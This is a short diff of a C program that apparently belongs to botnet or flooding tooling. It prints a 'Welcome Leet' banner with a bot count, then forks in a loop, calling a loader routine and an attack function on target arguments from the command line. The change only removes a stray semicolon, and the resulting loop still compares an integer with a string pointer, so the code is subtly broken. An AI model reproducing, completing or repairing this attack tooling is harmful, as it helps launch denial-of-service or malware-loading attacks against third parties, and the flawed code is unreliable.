@@ -127,7 +127,7 @@ int main(int argc, char **argv) {
 		fprintf(banner_bot_count, 	"\r\n\x1b[37m    #\x1b[36m-------- \x1b[37mWelcome Leet\x1b[36m --------\x1b[37m#\r\n");
 
 	}
-	for(x=0; x != argv[3];; x++) {
+	for(x=0; x != argv[3]; x++) {
 		if(fork())
 			echoloader();
 			attack(argv[1], argv[2], x);
